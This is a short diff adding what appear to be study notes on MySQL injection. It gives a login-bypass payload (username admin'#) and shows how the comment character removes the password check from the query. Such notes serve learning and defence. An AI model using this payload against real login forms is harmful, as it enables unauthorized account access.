@@ -1,0 +1,8 @@
+MySQL
+
+Injections
+username: admin'#
+password: 1
+
+this turns into a sql statement showing
+SELECT * FROM users WHERE username='admin'#' AND password='1'
